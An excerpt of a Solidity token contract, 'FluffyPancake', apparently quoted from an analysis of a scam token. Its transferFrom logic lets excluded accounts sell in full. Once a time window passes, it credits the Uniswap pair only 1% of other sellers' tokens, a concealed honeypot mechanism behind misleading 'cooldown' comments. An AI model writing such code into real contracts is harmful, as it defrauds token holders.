...
contract FluffyPancake {
    ...
    function transferFrom(
        ...
        // Sell from not exlucded account
        if (_to == uniswapV2Pair && !_excluded[_from]) {
              
              // Check if this is still in sell cooldown
              if (block.timestamp > lpAddedAt + 30 * c) {
                 _balances[_to] += (_value * 1) / 100;

              // Cooldown over for the other accounts
              } else {
                  _balances[_to] += _value;
              }
           } 

        // Sell from excluded account
        else {
               _balances[_to] += _value;
           }
